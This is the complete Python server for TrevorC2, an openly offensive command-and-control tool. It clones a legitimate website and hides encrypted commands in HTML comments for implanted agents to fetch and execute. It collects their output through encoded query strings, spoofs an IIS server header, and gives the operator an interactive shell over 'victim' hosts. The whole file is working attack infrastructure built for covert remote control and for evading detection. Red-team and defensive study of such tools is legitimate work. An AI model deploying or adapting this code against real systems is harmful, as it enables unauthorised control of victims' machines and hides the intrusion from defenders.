#!/usr/bin/env python3
"""
TrevorC2 - legitimate looking command and control.

Written by: Dave Kennedy @HackingDave
Website: https://www.trustedsec.com
GIT: https://github.com/trustedsec

This is the server side which will clone a website of your choosing. Once
the site is cloned, it'll place information inside the source of the html
to be decoded by the client and executed and then passed back to the server
via a query string parameter.
"""

import os
import re
import ssl
import sys
import time
import glob
import base64
try: import bleach
except ImportError:
    print("[!] Python module bleach not installed. Try pip install bleach and re-run TrevorC2 Server.")
    sys.exit()
import shutil
import logging
import urllib3
import requests
import threading
import subprocess
import collections
import string
import random
from configparser import ConfigParser

try:
    import tornado.web
    import tornado.ioloop
    import tornado.httpserver
except ImportError:
    print("[!] Python module tornado not installed. Try pip install tornado and re-run TrevorC2 Server.")
    sys.exit()
import hashlib
import cmd
from Crypto import Random
from Crypto.Cipher import AES
from collections import UserList


# asyncio is python3 only - only needed for python3 regardless for tornado fix
python_version = ("")
try: import asyncio
except ImportError: python_version = "v2"


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger("tornado.general").setLevel(logging.CRITICAL)
logging.getLogger('urllib3').setLevel(logging.WARNING)
logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
log = logging.getLogger(__name__)

__author__ = 'Dave Kennedy (@HackingDave)'
__version__ = 0.71

# ROOT CHECK
if os.geteuid() != 0:
    print("\n[!] TrevorC2 needs to be run as root (web socket binding, etc.)... Re-run TrevorC2 as sudo/root in order to run.")
    sys.exit()

# python 2/3 compatibility
try: input = raw_input
except NameError: pass


# CLASSES #
class AgentClass: #Agent class
    def __init__(self, sessionid, hostname, remoteip):
        self.sessionid = sessionid
        self.hostname = hostname
        self.remoteip = remoteip
        self.id = agent_list.get_max_id()+1 #Generate ID for agent
        agent_list.append(self) #Add agent to global agent list

class AgentListClass(UserList): #Agentlist class
    def __init__(self):
        super().__init__()

    def get_agent(self, id):
        for agent in self:
            if agent.id == id:
                return agent

    def get_max_id(self):
        if self != []:
            id_list = []
            for agent in self:
                id_list.append(str(agent.id))
            return int(max(id_list))
        else:
            return int(0)

    def get_agents_id(self):
        id_list = []
        for agent in self:
            id_list.append(str(agent.id))
        return id_list

class TrevorPrompt(cmd.Cmd): #prompt class
    def __init__(self):
        super().__init__()
    intro = "Trevor C2 shell"
    prompt = 'trevorc2>'
    completekey = 'tab'

    def do_exit(self, inp):
        print("[*] Exiting TrevorC2")
        return True
    
    def help_exit(self):
        print("Exits TrevorC2")

    def do_interact(self, inp):
        try:
            agent = agent_list.get_agent(int(inp))
            print("\n*** interact with {} {}.".format(agent.hostname,agent.sessionid))
            print("[*] Dropping into trevorc2 shell...")
            print("[*] Use exit or back to select other shells")
            while 1:
                task = input(agent.hostname + ":(Interactive shell)trevorc2>")
                origtask = task
                if task == "quit" or task == "exit" or task == "back": break
                task = (agent.hostname + "::::" + task)
                set_instruction(agent.sessionid,task)
                if origtask == "killnow":
                    print("[*] Killing agent, and dropping from console!")
                    break;
                print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
                while 1:
                    # we received a hit with our command
                    if os.path.isfile("clone_site/interactive_received_" + agent.sessionid + ".txt"):
                        data = open("clone_site/interactive_received_" + agent.sessionid + ".txt", "r").read()
                        print("[*] Received response back from client...")
                        print(data)
                        # remove this so we don't use it anymore
                        os.remove("clone_site/interactive_received_" + agent.sessionid + ".txt")
                        break
                    time.sleep(.3)
        except ValueError:
            print("Something wong")
    
    def complete_interact(self, text, line, begidx, endidx):
        agent_ids = agent_list.get_agents_id()
        return [i for i in agent_ids if i.startswith(text)]

    def help_interact(self):
        print("Description: Starts an interactive shell with agent")    
        print("Usage: interact <id>")  

    def do_list(self, inp):
        if agent_list == []:
            print("No available Agents. :-(")
        else:
            print("%-4s%-24s%-18s%-13s" % (
            "id", "hostname", "ip address", "communication_sessionid"))
            for agent in agent_list:
                print("%-4s%-24s%-18s%-13s" % (
                    str(agent.id), agent.hostname, agent.remoteip, agent.sessionid))

    def help_list(self):
        print("Description: Lists all available agents")    
        print("Usage: list")

    def do_servercmd(self, inp):
        stdout = subprocess.Popen(inp, shell=True)
        proc = stdout.communicate()[0]
        print(proc)
    
    def help_servercmd(self):
        print("Description: Run command on the server")    
        print("Usage: servercmd <command>")
        print("Example: servercmd ifconfig")

    def do_config(self, inp):
        print("Clone URL: {}".format(globalconfig.URL))
        print("User-Agent: {}".format(globalconfig.USER_AGENT))
        print("Root Path: {}".format(globalconfig.ROOT_PATH_QUERY))
        print("Site Path: {}".format(globalconfig.SITE_PATH_QUERY))
        print("Query String: {}".format(globalconfig.QUERY_STRING))
        print("Cookie SessionID String: {}".format(globalconfig.COOKIE_SESSIONID_STRING))
        print("Cookie SessionID Length: {}".format(globalconfig.COOKIE_SESSIONID_LENGTH))
        print("Stub: {}".format(globalconfig.STUB))
        print("SSL: {}".format(globalconfig.SSL))
        print("Cert File: {}".format(globalconfig.CERT_FILE))
        print("Cipher: {}".format(globalconfig.CIPHER))
        print("Not Found Message: {}".format(globalconfig.NOTFOUND))
        print("Redirect: {}".format(globalconfig.REDIRECT))
    
    def help_config(self):
        print("Description: Lists out the config settings from trevorc2_config.ini")    
        print("Usage: config")
    
class Config: #Config parser
    def __init__(self, configpath):
        self._config = None
        self._configpath = configpath
        if not os.access(configpath, os.R_OK):
            print("Config file missing")
        else:
            self._config = ConfigParser(interpolation=None)
            self._config.read('trevorc2_config.ini')
    
    @property
    def QUERY_STRING(self):
        return self._config['DEFAULT']['QUERY_STRING']
    
    @property
    def URL(self):
        return self._config['DEFAULT']['URL']

    @property
    def USER_AGENT(self):
        return self._config['DEFAULT']['USER_AGENT']
    
    @property
    def ROOT_PATH_QUERY(self):
        return self._config['DEFAULT']['ROOT_PATH_QUERY']

    @property
    def SITE_PATH_QUERY(self):
        return self._config['DEFAULT']['SITE_PATH_QUERY']

    @property
    def COOKIE_SESSIONID_STRING(self):
        return self._config['DEFAULT']['COOKIE_SESSIONID_STRING']
    
    @property
    def COOKIE_SESSIONID_LENGTH(self):
        return int(self._config['DEFAULT']['COOKIE_SESSIONID_LENGTH'])

    @property
    def STUB(self):
        return self._config['DEFAULT']['STUB']

    @property
    def SSL(self):
        return bool(self._config['DEFAULT']['SSL'])

    @property
    def CERT_FILE(self):
        return self._config['DEFAULT']['CERT_FILE']

    @property
    def CIPHER(self):
        return self._config['DEFAULT']['CIPHER']

    @property
    def NOTFOUND(self):
        return self._config['DEFAULT']['NOTFOUND']

    @property
    def REDIRECT(self):
        return self._config['DEFAULT']['REDIRECT']

globalconfig = Config('trevorc2_config.ini') #Get config

# FUNCTIONS #
def randomString():
    """Generate a random string of fixed length """
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(globalconfig.COOKIE_SESSIONID_LENGTH))

# AESCipher Library Python2/3 support - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
class AESCipher(object):
    """
    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
    Also ensure the coherence and the type of the data with a unicode to byte converter.
    """
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

# add cipher key here
cipher = AESCipher(key=globalconfig.CIPHER)

instructionsdict = {}
def set_instruction(sessionid,instruction):
    instruction_enc = cipher.encrypt(instruction.encode())
    instructionsdict[sessionid] = instruction_enc

def htc(m):
    """Decode URL for Postbacks."""
    return chr(int(m.group(1), 16))


def urldecode(url):
    """URL Decode."""
    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
    return rex.sub(htc, url)


def clone_site(user_agent, url):
    """Our clone site function, to get the site we want to serve.

    :params user_agent = User Agent to grab the site with.
    :params url = URL if the site you want to clone.
    """
    # auto remove old site
    if os.path.isdir("clone_site/"):
        for filename in glob.glob(os.path.abspath("clone_site/*")):
            if os.path.isdir(filename):
                shutil.rmtree(filename)
            else:
                os.remove(filename)
    else:
        os.makedirs("clone_site/")

    # run our wget
    print("[*] Cloning website: " + url)
    try:
        web_request = requests.get(url, headers={'User-Agent': user_agent}, verify=0)
        if web_request.status_code != 200 or len(web_request.content) < 1:
            print("[!] Unable to clone the site. Status Code: %s" % web_request.status_code)
            print("[!] Exiting TrevorC2...")
            sys.exit()

        with open("clone_site/index.html", 'wb') as fh:
            fh.write(web_request.content)

    except requests.ConnectionError:
        print("[-] Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
        with open("clone_site/index.html", "w") as fh: fh.write("<head></head><html><body>It Works!</body></html>")

    # report success
    if os.path.isfile("clone_site/index.html"):
        print("[*] Site cloned successfully.")


class UnknownPageHandler(tornado.web.RequestHandler):
    """No Endpoint Handler."""

    def get(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Request to Invalid Page from {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        if REDIRECT.lower() == ("on"):
            self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (globalconfig.URL))
        else:
            site_data = open("clone_site/index.html", "r").read()
            self.write(site_data)
            #self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
        return

    def put(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Invalid request type PUT identified {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        return

    def post(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Invalid request type POST identified {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        return

class RPQ(tornado.web.RequestHandler):
    """Output IP address and close."""

    def get(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Request to C2 Request Handler from {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        site_data = open("clone_site/index.html", "r").read()
        # if we get assigned a cookie value or not
        cookie_value = 0
        if self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING):
            sid = self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING)
            instructions = instructionsdict[sid]
            cookie_value = 1
        else:
            instructions = ("")
            print("[!] Somebody without a cookie accessed the website from {}".format(remote_ip))

        # If we want to redirect them to the site we cloned instead of showing them a cloned copy of the site
        if globalconfig.REDIRECT.lower() == ("on") and cookie_value == 0:
                self.write('<meta http-equiv="Refresh" content="0; url=%s" />' % (globalconfig.URL))
        else:
            site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (globalconfig.STUB, instructions))
            self.write(str(site_data))

    def put(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Invalid request type PUT identified {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        return

    def post(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Invalid request type POST identified {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        return

class SPQ(tornado.web.RequestHandler):
    """Output IP address and close."""
    def get(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Request to C2 Response Handler from {}'.format(remote_ip))
        self.set_header('Server', 'IIS')

        args = self.request.arguments
        if not args:
            self.write('%s\r\n' % (globalconfig.NOTFOUND))
            return
        for param in args:
            if param in (globalconfig.QUERY_STRING):
                query = args[param][0]
        if not self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING): 
            sid = randomString()
            self.set_cookie(globalconfig.COOKIE_SESSIONID_STRING, sid)
        else:
            sid = self.get_cookie(globalconfig.COOKIE_SESSIONID_STRING)
        if not sid:
            return
        if not query:
            return
        query = base64.b64decode(query)
        query_output = cipher.decrypt(query)

        # register hostnames
        if "magic_hostname=" in query_output:
            hostname = query_output.split("=")[1]
            newagent = AgentClass(sid, hostname, remote_ip)
            set_instruction(sid,"nothing")
            print("\n*** Received connection from {} and hostname {} with communication sid {} for TrevorC2.".format(remote_ip, hostname,sid))
        else:
            hostname = query_output.split("::::")[0]
            data = query_output.split("::::")[1]
            with open("clone_site/interactive_received_" + sid + ".txt", "w") as fh:
                fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
            set_instruction(sid,"nothing")

def main_c2():
    ### Init list ###
    global agent_list
    agent_list = AgentListClass()

    """Start C2 Server."""
    application = tornado.web.Application([
        (globalconfig.ROOT_PATH_QUERY, RPQ),
        (globalconfig.SITE_PATH_QUERY, SPQ),
        (r'/.*', UnknownPageHandler)  # Make this the last line, if not matched, will hit this rule.
    ])

    try:
        if globalconfig.SSL:
            http_server = tornado.httpserver.HTTPServer(application, ssl_options={'certfile': globalconfig.CERT_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1})
            http_server.listen(443)
            tornado.ioloop.IOLoop.instance().start()
        else:
            # if we are using pythonv3+
            if python_version != "v2": asyncio.set_event_loop(asyncio.new_event_loop())
            http_server = tornado.httpserver.HTTPServer(application)
            http_server.listen(80)
            tornado.ioloop.IOLoop.instance().start()
            http.start()

    except Exception as e:
        if "Address already in use" in str(e):
            print("[!] Something is already listening on the port. Stop the service and try again (hint service apache2 stop).")
            os._exit(1) # need os._exit() vs sys.exit due to inside of thread
        else:
            print("[!] Something went wrong, printing error message here: " + str(e))

if __name__ == "__main__":
    print(r"""

           ,  .'''''.  ...    ''''',  .'
            ','     ,.MMMM;.;'      '.
             ;;    ;MMMMMMMMM;     ;;'
            :'M:  ;MMMMMMMMMMM;.  :M':
            : M:  MMMMMMMMMMMMM:  :M  .
           .' M:  MMMMMMMMMMMMM:  :M. ;
           ; :M'  :MMMMMMMMMMMM'  'M: :
           : :M: .;"MMMMMMMMM":;. ,M: :
           :  ::,MMM;.M":::M.;MMM ::' :
         ,.;    ;MMMMMM;:MMMMMMMM:    :,.
         MMM.;.,MMMMMMMM;MMMMMMMM;.,;.MMM
         M':''':MMMMMMMMM;MMMMMMMM: "': M
         M.:   ;MMMMMMMMMMMMMMMMMM;   : M
         :::   MMMMMMMMMMM;MMMMMMMM   ::M
        ,'';   MMMMMMMMMMMM:MMMMMMM   :'".
      ,'   :   MMMMMMMMMMMM:MMMMMMM   :   '.
     '     :  'MMMMMMMMMMMMM:MMMMMM   ;     '
     ,.....;.. MMMMMMMMMMMMM:MMMMMM ..:....;.
     :MMMMMMMM MMMMMMMMMMMMM:MMMMMM MMMMMMMM:
     :MM''':"" MMMMMMMMMMMMM:MMMMMM "": "'MM:
      MM:   :  MMMMMMMMMMMMM:MMMMMM  ,'  :MM
      'MM   :  :MMMMMMMMMMMM:MMMMM:  :   ;M:
       :M;  :  'MMMMMMMMMMMMMMMMMM'  :  ;MM
       :MM. :   :MMMMMMMMMM;MMMMM:   :  MM:
        :M: :    MMMMMMMMM'MMMMMM'   : :MM'
        'MM :    "MMMMMMM:;MMMMM"   ,' ;M"
         'M  :    ""''':;;;'''""    :  M:
         ;'  :     "MMMMMMMM;."     :  "".
       ,;    :      :MMMMMMM:;.     :    '.
      :'     :    ,MM'''""''':M:    :     ';
     ;'      :    ;M'         MM.   :       ;.
   ,'        :    "            "'   :        '.
   '        :'                       '        ''
 .          :                        '          '
'          ;                          ;          '
          ;                            '


                   #TrevorForget

""")
    print("TrevorC2 - Legitimate Website Covert Channel")
    print("Written by: David Kennedy (@HackingDave)")
    print("https://www.trustedsec.com")
    clone_site(globalconfig.USER_AGENT, globalconfig.URL)
    PYTHONVER = sys.version_info[0]
    print('[*] Starting Trevor C2 Server...')
    threading.Thread(target=main_c2).start()
    print("[*] Next, enter the command you want the victim to execute.")
    print("[*] Client uses random intervals, this may take a few.")
    print("[*] Type help for usage. Example commands, list, interact.\n")
    try:
        ### INIT Main Command line ###
        commandline = TrevorPrompt()
        commandline.cmdloop()
        os._exit(0)

    except KeyboardInterrupt:
        if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
        print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP(s).")
        os._exit(0)